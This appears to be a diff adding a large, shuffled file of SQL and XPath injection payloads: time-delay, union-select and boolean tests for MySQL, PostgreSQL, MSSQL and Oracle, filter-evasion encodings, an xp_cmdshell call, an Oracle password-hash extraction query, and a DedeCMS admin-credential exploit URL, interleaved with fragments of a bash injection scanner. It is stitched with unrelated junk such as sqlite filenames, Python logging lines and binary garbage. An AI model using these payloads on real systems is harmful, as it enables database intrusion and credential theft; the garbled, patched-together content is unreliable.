@@ -1,0 +1,500 @@
+\\n union all select 1337,1337,1337,1337,1337,1337,1337,1337,1337 waitfor delay '00:02'
+0x00' union all select cast(pg_sleep(120) as integer),null,null,null,null,null,null --
+%0d%0a\\' union all select cast(pg_sleep(120) as integer),null,null,null,null,null,null,null,null --
+%0d%0a union all select '1337','1337','1337','1337' waitfor delay \'00:02\'
+%00\' union all select cast(pg_sleep(120) as integer),null,null,null,null,null,null,null,null,null --
+0x0a\\' union all select sleep(120),1337,1337,1337 --
+\\n' union all select cast(pg_sleep(120) as integer),'1337','1337','1337','1337','1337' --
+0x00\' union all select sleep(120),null,null --
+\r\n\' union all select 1337,1337,1337,1337 waitfor delay \'00:02\' --
+%0a\' union all select cast(pg_sleep(120) as text),'1337','1337','1337','1337','1337','1337','1337','1337' --
+%00 union all select cast(pg_sleep(120) as text),null,null,null,null --
+0x0a\\' union all select (select 1337 from pg_sleep(120)),null,null,null,null,null,null --
+0x0a' union all select sleep(120),1337,1337,1337,1337,1337,1337,1337,1337,1337 --
+%0a union all select sleep(120),null,null,null,null,null,null,null,null
+\r\n\' union all select sleep(120),1337,1337,1337,1337,1337,1337,1337,1337 --
+\\r\\n\\' union all select cast(pg_sleep(120) as text),1337,1337 --
+%0d%0a union all select cast(pg_sleep(120) as integer),'1337','1337','1337','1337','1337'
+\\' union all select cast(pg_sleep(120) as integer),1337,1337 --
+UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+\r\n union all select sleep(120),null,null,null,null --
+%0a and 1337=(select 1337 from (select sleep(120))A) --
+%0a waitfor delay '00:02'
+0x00\' union all select (select 1337 from pg_sleep(120)),null,null,null,null,null --
+\\n\\' union all select cast(pg_sleep(120) as integer),1337,1337,1337 --
+%0a union all select sleep(120) --
+%00 union all select sleep(120)
+%0d%0a union all select (select 1337 from pg_sleep(120)),null,null,null,null,null --
+ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
+\\r\\n\\' and 1337=(select 1337 from pg_sleep(120)) --
+' union all select cast(pg_sleep(120) as text),1337 --
+0x00\' union all select cast(pg_sleep(120) as text),1337,1337 --
+)) waitfor delay '0:0:__TIME__' /*
+\\n' union all select cast(pg_sleep(120) as text),null,null,null,null,null,null,null,null --
+0x0d0a union all select null,null,null,null,null,null,null,null,null,null waitfor delay '00:02'
+\\r\\n union all select 1337,1337,1337,1337,1337,1337 waitfor delay '00:02'
+0x00\\' union all select cast(pg_sleep(120) as text),'1337','1337' --
+0x00\\' union all select cast(pg_sleep(120) as integer),null,null --
+0x00;select pg_sleep(120)
+%0a union all select cast(pg_sleep(120) as integer),1337,1337,1337,1337,1337,1337,1337,1337
+\n' union all select cast(pg_sleep(120) as integer),1337,1337,1337,1337,1337 --
+%00 union all select cast(dbms_pipe.receive_message((\'a\'),120) as varchar2(10)),null from dual
+\r\n union all select '1337','1337','1337' from dual
+%0a' union all select cast(dbms_pipe.receive_message(1,120) as varchar2(10)),'1337','1337','1337','1337','1337','1337','1337','1337' from dual --
+0x0a' union all select cast(dbms_pipe.receive_message(('a'),120) as integer),1337 from dual --
+\\n union all select cast(dbms_pipe.receive_message((\'a\'),120) as integer),'1337','1337','1337','1337','1337','1337','1337','1337' from dual
+%0d%0a' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)) from dual --
+%0a union all select dbms_pipe.receive_message(1,120),1337,1337,1337,1337,1337 from dual --
+%0a union all select null,null from dual --
+%00\' union all select '1337','1337','1337','1337','1337','1337' from dual --
+0x0a' union all select cast(dbms_pipe.receive_message(1,120) as varchar2(10)),null,null,null from dual --
+0x0d0a union all select 1337,1337,1337,1337,1337,1337,1337,1337 from dual
+\n union all select cast(dbms_pipe.receive_message(('a'),120) as integer),1337,1337,1337,1337,1337,1337,1337 from dual --
+0x0a' union all select dbms_pipe.receive_message(('a'),120),'1337','1337','1337','1337','1337','1337','1337','1337' from dual --
+\n union all select dbms_pipe.receive_message((\'a\'),120),null,null,null,null,null,null from dual --
+%0d%0a union all select dbms_pipe.receive_message((\'a\'),120),1337,1337,1337,1337,1337,1337,1337,1337 from dual
+\n union all select cast(dbms_pipe.receive_message(1,120) as varchar2(10)),1337,1337,1337 from dual --
+\n union all select cast(dbms_pipe.receive_message((\'a\'),120) as varchar2(10)) from dual
+\\n' union all select dbms_pipe.receive_message(1,120),null,null,null,null,null,null,null,null from dual --
+\\n\\' union all select cast(dbms_pipe.receive_message((\\'a\\'),120) as varchar2(10)),'1337','1337','1337','1337','1337','1337','1337','1337','1337' from dual --
+\\r\\n' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),1337,1337,1337,1337,1337,1337,1337,1337 from dual --
+union all select cast(dbms_pipe.receive_message(1,120) as integer),1337,1337,1337 from dual --
+\\r\\n' union all select dbms_pipe.receive_message(('a'),120),null,null,null from dual --
+\\n union all select cast(dbms_pipe.receive_message(1,120) as varchar2(10)),'1337','1337','1337' from dual --
+0x00\' union all select null,null,null,null,null,null --
+\r\n union all select cast(dbms_pipe.receive_message(('a'),120) as integer),null,null,null,null from dual --
+union all select cast(dbms_pipe.receive_message(1,120) as integer),'1337','1337','1337','1337' from dual --
+\r\n' union all select 1337,1337,1337,1337,1337,1337,1337,1337,1337,1337 from dual --
+\r\n union all select cast(dbms_pipe.receive_message(1,120) as varchar2(10)),null,null,null,null,null,null from dual --
+%0d%0a union all select dbms_pipe.receive_message(('a'),120),'1337','1337','1337','1337','1337','1337' from dual
+\n union all select cast(dbms_pipe.receive_message((\'a\'),120) as varchar2(10)),null,null,null,null,null,null from dual
+\r\n\' union all select cast(dbms_pipe.receive_message(1,120) as varchar2(10)),'1337','1337','1337','1337','1337','1337','1337','1337' from dual --
+%00' union all select 1337,1337,1337 from dual --
+\n union all select dbms_pipe.receive_message(1,120),'1337','1337' from dual --
+0x00\\' union all select dbms_pipe.receive_message(1,120),null,null,null,null,null,null,null,null from dual --
+0x00 union all select cast(dbms_pipe.receive_message(('a'),120) as integer),1337,1337,1337,1337,1337,1337,1337,1337 from dual --
+0x0d0a' union all select cast(dbms_pipe.receive_message(1,120) as integer),null,null,null,null,null,null,null,null,null from dual --
+0x0d0a\' union all select cast(dbms_pipe.receive_message(1,120) as integer),1337,1337,1337,1337,1337,1337 from dual --
+' union all select '1337','1337','1337','1337','1337','1337','1337','1337','1337','1337' --
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+0x00\\' union all select null,null from dual --
+\r\n union all select cast(dbms_pipe.receive_message(('a'),120) as integer),'1337','1337','1337','1337','1337','1337' from dual
+union all select 1337,1337,1337 --
+0x0d0a\\' union all select cast(dbms_pipe.receive_message((\\'a\\'),120) as integer),null,null,null,null,null,null,null from dual --
+0x0a union all select cast(dbms_pipe.receive_message(1,120) as integer),null,null,null,null,null,null,null,null from dual
+union all select dbms_pipe.receive_message(('a'),120),'1337','1337','1337' from dual --
+0x00\\' union all select cast(dbms_pipe.receive_message(1,120) as integer),'1337','1337','1337','1337','1337','1337','1337','1337','1337' from dual --
+%0d%0a union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),null,null,null,null from dual --
+0x0a union all select '1337','1337','1337','1337','1337','1337','1337','1337','1337' from dual --
+\\n\\' union all select cast(dbms_pipe.receive_message((\\'a\\'),120) as varchar2(10)),null,null,null,null from dual --
+\\n' union all select null,null,null,null --
+0x00' union all select dbms_pipe.receive_message(1,120),null,null,null,null,null,null from dual --
+\r\n union all select cast(dbms_pipe.receive_message((\'a\'),120) as integer),null,null,null,null,null,null,null,null,null from dual
+\n union all select dbms_pipe.receive_message((\'a\'),120),'1337' from dual --
+%0a union all select cast(dbms_pipe.receive_message((\'a\'),120) as integer),1337,1337,1337,1337,1337,1337,1337,1337,1337 from dual
+\\r\\n union all select dbms_pipe.receive_message(('a'),120),null from dual --
+\r\n' union all select cast(dbms_pipe.receive_message(('a'),120) as integer),null from dual --
+0x0d0a\\' union all select '1337','1337','1337','1337','1337','1337','1337','1337','1337','1337' --
+0x0d0a\\' union all select cast(dbms_pipe.receive_message(1,120) as varchar2(10)),null,null from dual --
+\r\n union all select cast(dbms_pipe.receive_message(1,120) as integer),null,null,null,null,null,null,null from dual
+union all select '1337','1337','1337','1337','1337','1337','1337','1337','1337'
+root' or 1=1--
+AND 7506=9091 AND (5913=5913
+root" or 1=1
+root'or 1=1 or ''='
+AND 7300=7300 AND ('pKlZ'='pKlZ
+or 1=1--
+# the payload is an or 1=1: if its not longer, its not worked
+AND 1=0 AND '%'='
+AS INJECTX WHERE 1=1 AND 1=0#
+2 and 456=678
+hi or 1=1 --"
+OR 1=0--
+0x00 or 20=20
+WHERE 1=1 AND 1=0#
+OR 3409=3409 AND ('pytW' LIKE 'pytY
+AND 7300=7300 AND ('pKlZ'='pKlY
+AND 7506=9091 AND ('5913=5913
+badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
+AND 1=1
+or 1=1 /*
+admin" or 1=1#
+OR 1=1#
+WHERE 1=1 AND 1=1
+AND 1=1
+or 20=20
+root' or 1=1/*
+0x0d0a\\' or 20=20 --
+\\n' or 20=20 --
+23 or 1=1; --
+AS INJECTX WHERE 1=1 AND 1=0
+%0d%0a\\' or 20=20 --
+AS INJECTX WHERE 1=1 AND 1=1#
+‘ or 1=1 --
+\\r\\n or 20=20
+or 1=1 /*
+OR 1=1--
+OR 1=1#
+AS INJECTX WHERE 1=1 AND 1=1#
+" or 1=1
+or 0=0 --
+' or 3=3 --
+or 1=1--
+or%201=1 --
+a" or 1=1--
+or 1=1/*
+admin" or 1=1/*
+\' or 20=20 --
+AS INJECTX WHERE 1=1 AND 1=1
+%0a\' or 20=20 --
+' or 0=0 --
+\n' or 20=20 --
+%0a or 20=20
+AND 7300=7300 AND 'pKlZ'='pKlY
+WHERE 1=1 AND 1=1--
+AND 1083=1083 AND ('1427=1427
+badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
+" or 1=1--
+OR 1=0#
+' or 1=1 --
+AND 1=1 AND '%'='
+a' or 3=3--
+\n or 20=20
+\\r\\n' or 20=20 --
+AND 1=1 AND '%'='
+or 1=1#
+0x0a' or 20=20 --
+%00' or 20=20 --
+' and 1=0) union all
+%00\' or 20=20 --
+badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%29%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3d%30%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%61"`
+obuff=$obuff"%2f%2a%5b%31%5d"
+badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3d%30%20%6f%72%20%2f%61%5b%61"`
+end="%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%62"
+")))) and 0=benchmark(3000000,MD5(1))%20%23
+N) # Filter Evasion Intermediary chars ' ' => '%2f%2a%0B%0C%0D%0A%09%2a%2f'
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%2c0%2c%31%29%3d%27a%27$end"`
+%27%20or%201=1
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%2c0%2c%31%29%3d%27a%27$end"`
+' and 0=benchmark(3000000,MD5(1))%20%23
+vbuff="%2f%2a%5b$xcount%5d"
+badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3e%30%20%6f%72%20%2f%61%5b%27%61"`
+badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%29%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3e%30%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%61"`
+" and 0=benchmark(3000000,MD5(1))%20%23
+badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3d%30%20%6f%72%20%2f%61%5b%27%61"`
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3e%30%20%6f%72%20%27%61%27%3d%27%62"`
+echo "  -z Multi-byte quote                   '''        '%bf%27'                      MYSQL      "
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3d%30%20%6f%72%20%27%61%27%3d%27%62"`
+") and 0=benchmark(3000000,MD5(1))%20%23
+encodeoutput=`echo $encodeoutput | replace "%20" "%234i5ugh4iuh%0a"`
+#	encodeoutput=`echo $encodeoutput | replace "select" "se%2f%2a%2a%2flect" | replace "union" "uni%2f%2a%2a%2fon" | replace "and" "an%2f%2a%2a%2fd" | replace "or" "o%2f%2a%2a%2fr" | replace "order" "ord%2f%2a%2a%2fer" | replace "by" "b%2f%2a%2a%2fy" | replace "delay" "del%2f%2a%2a%2fay" | replace "dual" "du%2f%2a%2a%2fal" | replace "exec" "ex%2f%2a%2a%2fec" | replace "from" "fr%2f%2a%2a%2fom" | replace "having" "hav%2f%2a%2a%2fing" | replace "waitfor" "wai%2f%2a%2a%2ftfor" | replace "case" "ca%2f%2a%2a%2fse" | replace "when" "wh%2f%2a%2a%2fen" | replace "then" "th%2f%2a%2a%2fen" | replace "else" "el%2f%2a%2a%2fse" | replace "end" "en%2f%2a%2a%2fd" | replace "len" "le%2f%2a%2a%2fn" | replace "ascii" "as%2f%2a%2a%2fcii" | replace "substr" "su%2f%2a%2a%2fbstr"`
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`
+echo "  -N Intermediary chars space           ' '        '%2f%2a%0B%0C%0D%0A%09%2a%2f' All        "
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%40%2a%5b$battcount%5d%2c0%2c%31%29%3d%27a%27$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%74%65%78%74%28%29%2c$icount%2c%31%29%3d%27$char%27$end"`
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%29%2c0%2c%31%29%3d%27a%27$end"`
+end="%20%6f%72%20%2f%61%5b%27%61"
+))) and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20%23
+and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%29%5d%7c%2f%2f%2a%7c%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%61"`
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$nodename%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d$position%5d%29%2c$cflag%2c%31%29%3d%27$i%27%20%6f%72%20%27%61%27%3d%27%62"`
+begin="%33%34%35%27%29%5d"
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+echo "  -w Comment+newline space              ' '        '%2d%2d%0a'                   MYSQL,MSSQL"
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+end="%20%6f%72%20%27%65%27%3d%27%72"
+")) and 0=benchmark(3000000,MD5(1))%20%23
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$outbuf%2f%74%65%78%74%28%29%29%3e%31%20%6f%72%20%27%61%27%3d%27%62"`
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%40%2a%5b$battcount%5d%2c$bicount%2c%31%29%3d%27$char%27$end"`
+') and 0=benchmark(3000000,MD5(1))%20%23
+badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%29%5d%20%6f%72%20%63%6f%75%6e%74%28%2f%2a%29%3d%30%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%61"`
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%2c$comicount%2c%31%29%3d%27$char%27$end"`
+/uploads/plus/rss.php?tid=1&_Cs[][1]&_Cs[2%29%29%20AND%20%22%27%22%20AND%20updatexml%281,%28SELECT%20CONCAT%280x5b,uname,0x3a,MID%28pwd,4,16%29,0x5d%29%20FROMdede_admin%29,1%29%23%27][0]=1/plus/infosearch.php?action=search&q=%cf'%20union%20select%201,2,userid,4,pwd,6%20from%20dede_admin/*
+badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%29%5d%7c%2f%2f%61%7c%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%27%61"`
+)) and 0=benchmark(3000000,MD5(1))%20%23
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%74%65%78%74%28%29%2c0%2c%31%29%3d%27a%27$end"`
+0x00;select case when 20=20 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+0x0a\' or 20<94 --
+0x0a or 'xyz'='xyz'
+0x0a and 1337=dbms_pipe.receive_message((\\'a\\'),120)
+0x0a';select banner from v$version --
+0x00\';select @@version --
+0x0a;select @@version
+0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+0x0d0a or 1337=dbms_pipe.receive_message(1,120)
+0x0a\\';select version from v$instance --
+0x00 or 1337=dbms_pipe.receive_message(1,120)
+0x00' or 1337=dbms_pipe.receive_message(1,120) --
+0x0a and 1337=dbms_pipe.receive_message(1,120) --
+0x0a and 1337=dbms_pipe.receive_message(('a'),120)
+0x00';select version from v$instance --
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+0x0a\\';select case when 20=20 then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual  --
+0x00\' or \'xyz\'=\'xyz
+0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
+0x0a\\' or \\'xyz\\'=\\'xyz\\' --
+0x00';select case when 20=20 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual  --
+0x00' or 1337=dbms_pipe.receive_message(('a'),120) --
+0x00 or \\'xyz\\'=\\'xyz\\'
+declare @q nvarchar (200) 0x730065006c00650063 ...
+0x0a' and 1337=dbms_pipe.receive_message(1,120) --
+0x0a;select @@version --
+0x0d0a' or 1337=dbms_pipe.receive_message(('a'),120) --
+0x77616974666F722064656C61792027303A303A313027 ...
+0x0d0a\' or 1337=dbms_pipe.receive_message((\'a\'),120) --
+%00 or 1337=dbms_pipe.receive_message((\'a\'),120) --
+%00' or 'xyz'='xyz' --
+%00;select version() --
+%00;select @@version --
+%00\';select version from v$instance --
+%00;select banner from v$version
+echo "%00"$quack >> nullpayloads.txt
+%00 or 1337=dbms_pipe.receive_message(1,120) --
+%00' or 20<94 --
+%00 and 1337=dbms_pipe.receive_message((\'a\'),120) --
+%00 or \\'xyz\\'=\\'xyz\\' --
+%00' or 1337=dbms_pipe.receive_message(1,120) --
+%00 and 1337=dbms_pipe.receive_message((\\'a\\'),120) --
+%00;select case when 20=20 then \'a\'||dbms_pipe.receive_message(1,120) else null end from dual --
+%00;select banner from v$version --
+%00\';select case when 20=20 then \'a\'||dbms_pipe.receive_message((\'a\'),120) else null end from dual  --
+%00\\' or \\'xyz\\'=\\'xyz
+%00 or \'xyz\'=\'xyz\' --
+%00;select case when 20=20 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual --
+%00\\';select version() --
+ORDER BY 16
+ORDER BY 26--
+\\';select @@version --
+%0a;select version() --
+and (select substring(@@version,1,1))='M'
+or 1 in (select @@version)--
+ORDER BY 22
+%0d%0a';select @@version --
+ORDER BY 10#
+and (select substring(@@version,2,1))='i'
+ORDER BY 24--
+a' order by 9999#
+ORDER BY 3--
+\n';select version() --
+\r\n;select @@version
+ORDER BY 2--
+ORDER BY 16
+ORDER BY 16#
+ORDER BY 27
+ORDER BY 25
+%0d%0a\';select version() --
+ORDER BY 4#
+ORDER BY 2#
+ORDER BY 1--
+ORDER BY 28--
+ORDER BY 24#
+\\r\\n';select @@version --
+ORDER BY 16--
+1' ORDER BY 2--+
+ORDER BY 2
+1,test-2.sqlite
+badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring($findme,$oflag,1)) > $asciinumber) then benchmark(10000000,MD5(1)) else 0 end)$end"`
+# /foobar.asp
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+#oraclecheck - only works on string params
+4,run-423.sqlite
+\r\n;select version from v$instance --
+4,run-134.sqlite
+echo "  -e SQL delay injection"
+#where a POST with URIs is found, first time it'll scan the POST URIs, next time it'll scan the POST data params. (or the other way round.. i cant remember)
+# also, for POSTs, we only send one good request per URL instead of one per parameter
+while [[ $ahcount -le $maxxcount ]] ; do
+7,db-setup.sqlite
+#	#	#this tries to account for apps that return a status 200 error page by measuring response length diffs
+'
+1,testcod-1000055.sqlite3
+4,run-907.sqlite
+4,run-259.sqlite
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+%0d%0a union all select cast(dbms_pipe.receive_message(('a'),120) as integer),null,null,null,null,null from dual -- 
+1,padu-destination.sqlite
+4,run-377.sqlite
+' or ''&'
+4,run-530.sqlite
+inputbuffer=`echo $inputbuffer | replace " " "/*d*/"`
+8,run-97.sqlite
+# 0 no postURI params (this must be a GET or a normal POST)
+elif [[ "$xp" == "dualconditionalnumeric" ]] ; then
+4,run-480.sqlite
+1' GROUP BY 1,2,--+
+self.log.error('Could not create SQLite database. Please try again.')
+4,run-403.sqlite
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+length_false=`echo $response | cut -d ":" -f 2`
+a'||/**/456=678#
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
+4,run-326.sqlite
+4,run-338.sqlite
+# In the case of a 'normal' POST request, POST body parameters are preceded with ?, like this:
+static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
+headertoset="$headertoadd"
+inurl:&#8221;games.php?id=
+4,run-138.sqlite
+? ? ???-?-?-?!??
+if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
+J) # Filter Evasion nesting 'select' => 'selselectect'
+10,run-18.sqlite
+4,run-430.sqlite
+4,run-921.sqlite
+1,oqmd-1514.sqlite3
+4,run-837.sqlite
+while [[ $bicount -le $length ]] ; do
+#echo "postdataparams $postdataparams"
+4,run-770.sqlite
+D)  #back end dbms
+output='';
+# if this fails, continue to re-run the full lettergrab() as normal...
+4,run-105.sqlite
+4,2823318777ntouromlalnodry--naod.sqlite
+echo -n "<Input type="text" size=80 name=\"$paramname\" value=\"$decparam\"> " >> ./output/$safelogname-report-$safefilename.html
+' or 1 --'
+if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+4,run-169.sqlite
+#initialise some variables:
+echo "<H4>XPath Injection Data</H4>" >> ./output/$safelogname-report-$safefilename.html
+if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi
+self.log.debug("DB lock acquired")
+) or benchmark(10000000,MD5(1))#"
+4,run-637.sqlite
+in****:"ADODB.Command"
+6,5.2.5-6.0.0.sqlite
+firstchar="${payload:1:1}"
+"^"
+stringlength=${#uriinputencode}
+a" or "dfth"="dfth"-- #
+4,run-197.sqlite
+output=''
+")) or benchmark(10000000,MD5(1))#
+4,run-905.sqlite
+\' and 1337=dbms_pipe.receive_message(1,120) --
+echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safelogname$safefilename.txt
+operation="ADD"
+119) output="w" ;;
+4,run-596.sqlite
+A?{??b?)????"????2ܼ??%?????&?
+length_false=`echo $response | cut -d ":" -f 2`
+echo -n " "
+4,run-818.sqlite
+# presence of this file whenever a scan is launched
+4,run-136.sqlite
+#get="GET "
+B?4A=?=Bc                 ?   ? 	 | ?                     |?  ?         d S #  | j        ?                    d?  ?         Y d S xY w)Nz;Could not open SQLite database file. Is the file corrupted?)r   r   r   )r   r   s     r   ?openDBzDatabase.openDB)   sJ   ? ?	Z??*?*?:?6?6?6?6?6??	Z??H?N?N?X?Y?Y?Y?Y?Y?Y???s   ? ?8?
+if [[ "$xpathCheck" != "" ]] ; then
+4,run-164.sqlite
+a" and "fghi"="fghj"-- #
+echo "Trying status/length-based data extraction"
+root") or ("1"="1
+1,flasky-sqlalchemy-dev-sqlite3.sqlite
+4,run-767.sqlite
+((timediff=$time_true-$time_false))
+1,test-rel.sqlite3
+tput sgr0 # Reset attributes.
+badparams=`echo "$cleanoutput" | replace "$payload" "1/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
+%0d%0a\\' and 1337=dbms_pipe.receive_message(1,120) --
+echo "XPath element hierachy found at ./output/$safelogname.$safehostname.xpath"
+echo "POST" $outer"???"$mparams
+nullwrongstring=$nullwrongstring"null"
+while [[ $attgcount -le $maxxcount ]] ; do
+if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
+4,run-850.sqlite
+#set the vulnerable flag and sploit that mutha
+#	#	((half_i=$i/2))
+' or uname like '%
+4,run-967.sqlite
+4,run-307.sqlite
+create user name identified by 'pass123'
+" or "" "
+4,run-779.sqlite
+or '7659'='7659
+4,run-102.sqlite
+# or "URL number" last scanned) in a session file and then checking for the
+)) and 0=benchmark(3000000,MD5(1))%20--
+stringofparams=`echo $params | tr "&" " "`
+if [[ "$status1" != "200" && "$status1" == "$status999" && "$timedelay" == "0" ]] ; then
+iu=".child node: ---"
+if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $inputbuffer";fi
+## Remote Command Execution using SQLite command - Attach Database
+#always true:                                       #345)] or count(/*)>0 or /a[contains(a,a
+#		captureflag=1
+((lendiff=$lengthselY-$lengthselN))
+4,run-590.sqlite
+#if we are not creating an input file from a burp log (-P), and no payloads have been specified, ask for a payload:
+8,run-59.sqlite
+echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output"
+\\' or \\'xyz\\'=\\'xyz\\' --
+4,run-726.sqlite
+echo "Some examples are: -s, -n, -q, -r, -e, -b, -C" >&2
+1,safari-partial.sqlite
+8,run-22.sqlite
+admin" or "1"="1
+\\n\\' or 1337=dbms_pipe.receive_message(1,120) --
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+elif [[ $dbms == "oracle" ]] ; then
+echo -n "$char" >> ./listofxpathelements.txt
+8,run-86.sqlite
+???'??ƥ???m?/ܩ??%d?"Ռ(d?2?E?A??(????'???+? ύ??B?????^?? V???p\? D\?5? ?2Ǒ?*ߙB?OZ}ݏ)
+1,storage-sync.sqlite
+" or "a"="a
+" or ""&"
+%0d%0a and 1337=dbms_pipe.receive_message(('a'),120)
+')) and 0=benchmark(3000000,MD5(1)) #
+\\r\\n;select case when 20=20 then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual --
+###loop to grab the list of accessible nodes
+)%20or%20('x'='x
+)) and 0=benchmark(3000000,MD5(1)) #
+#status1=200
+if [[ true = "$n" || true = "$s" || true = "$e" || true = "$b" || true = "$q" || true = "$r" || true = "$C" ]] ; then
+; exec ('sel' + 'ect us' + 'er')
+4,run-111.sqlite
+#echo "ecount: $ecount xcount: $xcount"            # $begin or count($xbuff)=1$end
+4,run-608.sqlite
+#set the vulnerable flag and sploit that mutha
+4,run-459.sqlite
+1,bio-fake.sqlite3
+';
+echo "Attempting to brute force $findme. If you get bored hit CNTRL+c to skip. Please wait..."
